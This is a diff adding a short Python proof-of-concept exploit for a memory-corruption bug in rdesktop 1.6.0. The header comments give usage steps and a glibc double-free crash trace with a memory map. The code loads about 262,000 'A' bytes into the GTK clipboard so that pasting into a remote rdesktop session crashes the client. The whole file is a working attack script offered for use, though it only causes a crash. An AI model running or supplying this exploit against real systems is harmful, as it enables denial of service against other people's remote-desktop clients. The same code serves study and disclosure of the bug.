@@ -1,0 +1,106 @@
+#rdestkop 1.6.0 Memory Corruption (Copy from clipboard) PoC
+#By Dame Jovanoski (badc0re)
+#
+# This is the result of 262120 inserted into clipboard and coppied on remote machine
+# using rdesktop 1.6.0 tested od Ubuntu 9.10.
+#
+# Use of this exploit: python rdeskop.py.
+# 
+# And next is shift-insert(or ctrl-v) for copy.
+# 
+# This is what you get:
+#
+#root@bt:~# rdesktop 192.168.204.133
+#WARNING: Remote desktop does not support colour depth 24; falling back to 16
+#*** glibc detected *** rdesktop: double free or corruption (fasttop): 0x083f3250 ***
+#======= Backtrace: =========
+#/lib/tls/i686/cmov/libc.so.6[0xb7a4d454]
+##/lib/tls/i686/cmov/libc.so.6(cfree+0x96)[0xb7a4f4b6]
+#/usr/lib/libX11.so.6(XFree+0x1d)[0xb7b74fdd]
+#rdesktop[0x805f43f]
+#rdesktop[0x805a2b6]
+##rdesktop[0x80630ff]
+#rdesktop[0x80636d8]
+#rdesktop[0x8063848]
+#rdesktop[0x8064013]
+#rdesktop[0x806484b]
+#rdesktop[0x80663e3]
+#rdesktop[0x80672b9]
+#rdesktop[0x8067dbc]
+#rdesktop[0x804ec2a]
+#/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xe5)[0xb79f4685]
+#rdesktop[0x804ca61]
+#======= Memory map: ========
+#08048000-0807c000 r-xp 00000000 03:01 114747     /usr/bin/rdesktop
+#0807c000-0807d000 r--p 00034000 03:01 114747     /usr/bin/rdesktop
+#0807d000-0807f000 rw-p 00035000 03:01 114747     /usr/bin/rdesktop
+#0807f000-08418000 rw-p 00000000 00:00 0          [heap]
+#b7500000-b7521000 rw-p 00000000 00:00 0
+#b7521000-b7600000 ---p 00000000 00:00 0
+#b769b000-b771c000 rw-p 00000000 00:00 0
+#b791d000-b7925000 r-xp 00000000 03:01 120953     /usr/lib/libXrender.so.1.3.0
+#b7925000-b7926000 r--p 00007000 03:01 120953     /usr/lib/libXrender.so.1.3.0
+#b7926000-b7927000 rw-p 00008000 03:01 120953     /usr/lib/libXrender.so.1.3.0
+#b7927000-b792f000 r-xp 00000000 03:01 120903     /usr/lib/libXcursor.so.1.0.2
+#b792f000-b7930000 rw-p 00007000 03:01 120903     /usr/lib/libXcursor.so.1.0.2
+#b7933000-b7940000 r-xp 00000000 03:01 105519     /lib/libgcc_s.so.1
+#b7940000-b7941000 r--p 0000c000 03:01 105519     /lib/libgcc_s.so.1
+#b7941000-b7942000 rw-p 0000d000 03:01 105519     /lib/libgcc_s.so.1
+#b7942000-b794c000 r-xp 00000000 03:01 122321     /lib/tls/i686/cmov/libnss_files-2.8.90.so
+#b794c000-b794d000 r--p 00009000 03:01 122321     /lib/tls/i686/cmov/libnss_files-2.8.90.so
+#b794d000-b794e000 rw-p 0000a000 03:01 122321     /lib/tls/i686/cmov/libnss_files-2.8.90.so
+#b794e000-b7957000 r-xp 00000000 03:01 122325     /lib/tls/i686/cmov/libnss_nis-2.8.90.so
+#b7957000-b7958000 r--p 00008000 03:01 122325     /lib/tls/i686/cmov/libnss_nis-2.8.90.so
+#b7958000-b7959000 rw-p 00009000 03:01 122325     /lib/tls/i686/cmov/libnss_nis-2.8.90.so
+#b7959000-b796e000 r-xp 00000000 03:01 122315     /lib/tls/i686/cmov/libnsl-2.8.90.so
+#b796e000-b796f000 r--p 00014000 03:01 122315     /lib/tls/i686/cmov/libnsl-2.8.90.so
+#b796f000-b7970000 rw-p 00015000 03:01 122315     /lib/tls/i686/cmov/libnsl-2.8.90.so
+#b7970000-b7972000 rw-p 00000000 00:00 0
+#b7972000-b7979000 r-xp 00000000 03:01 122317     /lib/tls/i686/cmov/libnss_compat-2.8.90.so
+#b7979000-b797a000 r--p 00006000 03:01 122317     /lib/tls/i686/cmov/libnss_compat-2.8.90.so
+#b797a000-b797b000 rw-p 00007000 03:01 122317     /lib/tls/i686/cmov/libnss_compat-2.8.90.so
+#b797b000-b797c000 rw-p 00000000 00:00 0
+#b797c000-b7980000 r-xp 00000000 03:01 120909     /usr/lib/libXdmcp.so.6.0.0
+#b7980000-b7981000 rw-p 00003000 03:01 120909     /usr/lib/libXdmcp.so.6.0.0
+#b7981000-b7982000 rw-p 00000000 00:00 0
+#b7982000-b7984000 r-xp 00000000 03:01 120891     /usr/lib/libXau.so.6.0.0
+#b7984000-b7985000 rw-p 00001000 03:01 120891     /usr/lib/libXau.so.6.0.0
+#b7985000-b799c000 r-xp 00000000 03:01 215752     /usr/lib/libxcb.so.1.0.0
+#b799c000-b799d000 r--p 00016000 03:01 215752     /usr/lib/libxcb.so.1.0.0
+#b799d000-b799e000 rw-p 00017000 03:01 215752     /usr/lib/libxcb.so.1.0.0
+#b799e000-b799f000 r-xp 00000000 03:01 215748     /usr/lib/libxcb-xlib.so.0.0.0
+#b799f000-b79a0000 r--p 00000000 03:01 215748     /usr/lib/libxcb-xlib.so.0.0.0
+#b79a0000-b79a1000 rw-p 00001000 03:01 215748     /usr/lib/libxcb-xlib.so.0.0.0
+#b79a1000-b79a8000 r-xp 00000000 03:01 122334     /lib/tls/i686/cmov/librt-2.8.90.so
+#b79a8000-b79a9000 r--p 00007000 03:01 122334     /lib/tls/i686/cmov/librt-2.8.90.so
+#b79a9000-b79aa000 rw-p 00008000 03:01 122334     /lib/tls/i686/cmov/librt-2.8.90.so
+#b79aa000-b79bf000 r-xp 00000000 03:01 122330     /lib/tls/i686/cmov/libpthread-2.8.90.so
+#b79bf000-b79c0000 r--p 00014000 03:01 122330     /lib/tls/i686/cmov/libpthread-2.8.90.so
+#b79c0000-b79c1000 rw-p 00015000 03:01 122330     /lib/tls/i686/cmov/libpthread-2.8.90.so
+#b79c1000-b79c4000 rw-p 00000000 00:00 0
+#b79c4000-b79d8000 r-xp 00000000 03:01 215832     /usr/lib/libz.so.1.2.3.3
+#b79d8000-b79da000 rw-p 00013000 03:01 215832     /usr/lib/libz.so.1.2.3.3
+#b79da000-b79dc000 r-xp 00000000 03:01 122310     /lib/tls/i686/cmov/libdl-2.8.90.so
+#b79dc000-b79dd000 r--p 00001000 03:01 122310     /lib/tls/i686/cmov/libdl-2.8.90.Aborted
+
+from struct import *
+import time
+import pygtk
+pygtk.require('2.0')
+import gtk 
+import sys
+
+print "Creating expoit."
+time.sleep(1)
+print "Creating explot.."
+time.sleep(1)
+print "Creating explot..."
+buf="\x41"*262120
+try:
+    clipboard = gtk.clipboard_get()
+    text=clipboard.wait_for_text()
+    clipboard.set_text(buf)
+    clipboard.store()
+    print "String is copied into clipboard."
+except:
+    print "String cannot be copied into clipboard."
